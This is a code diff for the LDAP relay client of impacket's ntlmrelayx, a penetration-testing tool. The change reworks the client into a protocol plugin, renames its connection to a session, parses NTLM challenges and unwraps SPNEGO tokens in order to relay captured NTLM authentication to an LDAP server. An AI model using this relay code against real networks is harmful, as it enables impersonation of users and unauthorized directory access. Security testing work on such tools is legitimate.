@@ -5,7 +5,10 @@
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
+# LDAP Protocol Client
+#
 # Author:
+#   Alberto Solino (@agsolino)
 #   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
 #
 # Description:
@@ -15,41 +18,55 @@
 # its code
 #
 import sys
+from struct import unpack
+from impacket import LOG
 from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD
 from ldap3.operation import bind
 try:
     from ldap3.core.results import RESULT_SUCCESS
 except ImportError:
-    print "ntlmrelayx requires ldap3 > 2.0. To update, use: pip install ldap3 --upgrade"
+    LOG.fatal("ntlmrelayx requires ldap3 > 2.0. To update, use: pip install ldap3 --upgrade")
     sys.exit(1)
+
+from impacket.examples.ntlmrelayx.clients import ProtocolClient
+from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
+from impacket.ntlm import NTLMAuthChallenge
+from impacket.spnego import SPNEGO_NegTokenResp
+
+PROTOCOL_CLIENT_CLASS = "LDAPRelayClient"
 
 class LDAPRelayClientException(Exception):
     pass
 
-class LDAPRelayClient(object):
+class LDAPRelayClient(ProtocolClient):
+    PLUGIN_NAME = "LDAP"
     MODIFY_ADD = MODIFY_ADD
 
-    def __init__(self, target, port=None):
-        self.target = target
+    def __init__(self, serverConfig, targetHost, targetPort = 389, extendedSecurity=True ):
+        ProtocolClient.__init__(self, serverConfig, targetHost, targetPort, extendedSecurity)
+        self.extendedSecurity = extendedSecurity
         self.negotiateMessage = None
         self.authenticateMessageBlob = None
-        self.connection = None
         self.server = None
 
-    def init_connection(self):
-        self.server = Server(self.target, get_info=ALL)
-        self.connection = Connection(self.server, user="a", password="b", authentication=NTLM)
-        self.connection.open(False)
+    def killConnection(self):
+        if self.session is not None:
+            self.session.socket.close()
+            self.session = None
+
+    def initConnection(self):
+        self.server = Server(self.targetHost, get_info=ALL)
+        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
+        self.session.open(False)
 
     def sendNegotiate(self, negotiateMessage):
         self.negotiateMessage = negotiateMessage
-        self.init_connection()
 
-        with self.connection.lock:
-            if not self.connection.sasl_in_progress:
-                self.connection.sasl_in_progress = True
-                request = bind.bind_operation(self.connection.version, 'SICILY_PACKAGE_DISCOVERY')
-                response = self.connection.post_send_single_response(self.connection.send('bindRequest', request, None))
+        with self.session.lock:
+            if not self.session.sasl_in_progress:
+                self.session.sasl_in_progress = True
+                request = bind.bind_operation(self.session.version, 'SICILY_PACKAGE_DISCOVERY')
+                response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                 result = response[0]
                 try:
                     sicily_packages = result['server_creds'].decode('ascii').split(';')
@@ -57,12 +74,14 @@ class LDAPRelayClient(object):
                     raise LDAPRelayClientException('Could not discover authentication methods, server replied: %s' % result)
 
                 if 'NTLM' in sicily_packages:  # NTLM available on server
-                    request = bind.bind_operation(self.connection.version, 'SICILY_NEGOTIATE_NTLM', self)
-                    response = self.connection.post_send_single_response(self.connection.send('bindRequest', request, None))
+                    request = bind.bind_operation(self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
+                    response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                     result = response[0]
 
                     if result['result'] == RESULT_SUCCESS:
-                        return result['server_creds']
+                        challenge = NTLMAuthChallenge()
+                        challenge.fromString(result['server_creds'])
+                        return challenge
                 else:
                     raise LDAPRelayClientException('Server did not offer NTLM authentication!')
 
@@ -71,17 +90,24 @@ class LDAPRelayClient(object):
         return self.negotiateMessage
 
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
-        with self.connection.lock:
-            self.authenticateMessageBlob = authenticateMessageBlob
-            request = bind.bind_operation(self.connection.version, 'SICILY_RESPONSE_NTLM', self, None)
-            response = self.connection.post_send_single_response(self.connection.send('bindRequest', request, None))
+        if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
+            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
+            token = respToken2['ResponseToken']
+        else:
+            token = authenticateMessageBlob
+        with self.session.lock:
+            self.authenticateMessageBlob = token
+            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
+            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
             result = response[0]
-        self.connection.sasl_in_progress = False
+        self.session.sasl_in_progress = False
 
         if result['result'] == RESULT_SUCCESS:
-            self.connection.bound = True
-            self.connection.refresh_server_info()
-        return result
+            self.session.bound = True
+            #self.session.refresh_server_info()
+            return None, STATUS_SUCCESS
+
+        return None, STATUS_ACCESS_DENIED
 
     #This is a fake function for ldap3 which wants an NTLM client with specific methods
     def create_authenticate_message(self):
@@ -90,8 +116,3 @@ class LDAPRelayClient(object):
     #Placeholder function for ldap3
     def parse_challenge_message(self, message):
         pass
-
-    #SMB Relay server needs this
-    @staticmethod
-    def get_encryption_key():
-        return None
